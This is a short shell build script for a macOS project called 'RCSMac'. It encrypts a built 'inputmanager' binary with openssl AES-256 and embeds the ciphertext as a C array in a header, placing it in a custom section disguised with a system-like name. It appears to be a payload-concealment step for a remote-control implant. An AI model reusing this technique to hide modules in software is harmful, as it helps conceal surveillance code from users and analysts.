cp ${BUILT_PRODUCTS_DIR}/${EXECUTABLE_PATH} /tmp/inputmanager_buff
/usr/bin/openssl enc -e -in /tmp/inputmanager_buff -out /tmp/inputmanager_buff_des -aes256 -nosalt -k ${AES_ENC_KEY}
echo "//" > ${SRCROOT}/Modules/RCSMInputmanager_aes.h
echo "// RCSMac - RCSMInputmanager_aes.h " >> ${SRCROOT}/Modules/RCSMInputmanager_aes.h
echo "//" >> ${SRCROOT}/Modules/Agents/RCSMInputmanager_aes.h
echo "// encrypted aes256 inputmanager include" >>${SRCROOT}/Modules/RCSMInputmanager_aes.h
echo "// automatically rebuilding date: `date`" >> ${SRCROOT}/Modules/RCSMInputmanager_aes.h
echo "//" >> ${SRCROOT}/Modules/RCSMInputmanager_aes.h
echo "" >> ${SRCROOT}/Modules/RCSMInputmanager_aes.h
echo "#ifdef __DARWIN" >> ${SRCROOT}/Modules/RCSMInputmanager_aes.h
echo "__attribute__ ((section (\"__DATA,__s_symbol_ptr\")))" >> ${SRCROOT}/Modules/RCSMInputmanager_aes.h
echo "#endif" >> ${SRCROOT}/Modules/RCSMInputmanager_aes.h
/usr/bin/openssl enc -e -in /tmp/inputmanager_buff -out /tmp/inputmanager_buff_des -aes256 -nosalt -k ${AES_ENC_KEY}
/usr/bin/xxd -i /tmp/inputmanager_buff_des >> ${SRCROOT}/Modules/RCSMInputmanager_aes.h